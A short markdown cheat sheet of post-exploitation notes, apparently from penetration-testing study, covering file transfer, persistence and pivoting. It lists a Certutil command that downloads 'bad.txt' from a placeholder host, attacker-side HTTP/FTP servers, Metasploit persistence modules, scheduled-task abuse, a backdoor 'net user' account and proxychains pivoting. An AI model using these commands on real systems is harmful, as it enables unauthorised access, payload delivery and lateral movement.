## Post Exploitation - Review

### File transfers
* python -m SimpleHTTPServer 80
* python -m pyftpdlib 21 (attacker ip)
*   ftp attackerip (windows machines)
* Certutil.exe -urlcache -f http://ip.address/bad.txt output.txt
* wget (linux machines)
* metasploit

### Maintaining access

#### Persistence Scripts (Metasploit)
* run persistence -h
* exploit/windows/local/persistence
* exploit/windows/local/registry_persistence

#### Scheduled Tasks
* run scheduleme
* run schtaskabuse

#### Add a user
* net user FakeUser Password1 /add

### Pivoting - Using a compromised device as a condui to reach new locations. For situations when a secondary device is only reachable through a compromised device, or for more covert activities (more in the realms of Red Teaming).

#### Proxychains: Bind port, Proxychain, Proxy  
    * device 1 has access to device 2 which is not reachable from our attacker machine device 0  
    * proxychain and bind port is setup on device 0  
    * proxy tunnel on devive 1  
    * target is device 2

* ssh (into device 1 and setup a proxy tunnel with a bind port, so all traffic will be proxied through device 1, between device 0 and 2.)
* proxychains nmap 10.10.10.225 | scans device 2 with standard nmap syntax, because this is pchained it may be unstable on syn scanning. So switch to -sT as tcp scanning could be better
